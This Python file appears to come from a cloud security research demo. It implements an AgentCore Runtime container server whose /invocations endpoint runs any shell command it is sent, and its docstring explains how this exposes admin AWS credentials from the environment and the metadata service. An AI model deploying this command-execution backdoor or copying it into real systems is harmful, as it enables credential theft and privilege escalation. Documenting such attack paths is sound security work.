#!/usr/bin/env python3
"""
Minimal HTTP server satisfying the AgentCore Runtime container contract.

AgentCore Runtime requires the container to serve two endpoints on port 8080:
  GET  /ping         - health check; runtime platform polls this until READY
  POST /invocations  - invocation endpoint; receives the InvokeAgentRuntimeCommand payload

In the attack scenario (bedrock-004) the attacker already has an existing Runtime
running this container with a victim admin execution role attached. The attacker
calls InvokeAgentRuntimeCommand with a payload containing a "command" key. The
server executes that command inside the runtime microVM. Because the execution role
has AdministratorAccess, its credentials are available in the environment (as
AWS_* variables) and via MMDS at 169.254.169.254. The attacker reads them and
obtains admin access without ever needing iam:PassRole or CreateAgentRuntime.

This container is kept deliberately minimal: it responds to health checks and
executes commands from the invocation payload. The actual credential extraction
step in the demo is performed by the attacker's InvokeAgentRuntimeCommand call.
"""

import json
import os
import http.server


class RuntimeHandler(http.server.BaseHTTPRequestHandler):
    """Request handler implementing the AgentCore Runtime HTTP interface."""

    def log_message(self, fmt, *args):  # noqa: N802
        # Suppress default stderr logging; use print so output appears in
        # CloudWatch Logs attached to the runtime.
        print(f"[runtime] {self.address_string()} - {fmt % args}")

    def do_GET(self):  # noqa: N802
        if self.path == "/ping":
            self._respond(200, {"status": "healthy"})
        else:
            self._respond(404, {"error": "not found"})

    def do_POST(self):  # noqa: N802
        if self.path == "/invocations":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length) if content_length > 0 else b""

            try:
                payload = json.loads(body) if body else {}
            except json.JSONDecodeError:
                payload = {"raw": body.decode("utf-8", errors="replace")}

            command = payload.get("command")
            if command:
                # Execute the command and return its stdout as the HTTP response
                # body. AgentCore maps the container's response body to
                # contentDelta.stdout in the InvokeAgentRuntimeCommand stream,
                # so the caller receives the command output directly.
                import subprocess
                try:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30,
                    )
                    stdout_bytes = result.stdout.encode("utf-8")
                    self.send_response(200)
                    self.send_header("Content-Type", "text/plain")
                    self.send_header("Content-Length", str(len(stdout_bytes)))
                    self.end_headers()
                    self.wfile.write(stdout_bytes)
                    if result.stderr:
                        print(f"[runtime] stderr: {result.stderr}")
                    print(f"[runtime] exit code: {result.returncode}")
                except subprocess.TimeoutExpired:
                    self._respond(500, {"error": "command timed out after 30s"})
                except Exception as exc:  # noqa: BLE001
                    self._respond(500, {"error": str(exc)})
            else:
                self._respond(200, {"result": "ok", "received": payload})
        else:
            self._respond(404, {"error": "not found"})

    def _respond(self, status_code: int, body: dict) -> None:
        encoded = json.dumps(body).encode("utf-8")
        self.send_response(status_code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(encoded)))
        self.end_headers()
        self.wfile.write(encoded)


def main() -> None:
    port = int(os.environ.get("PORT", "8080"))
    server_address = ("", port)
    httpd = http.server.HTTPServer(server_address, RuntimeHandler)
    print(f"[runtime] listening on port {port}")
    httpd.serve_forever()


if __name__ == "__main__":
    main()
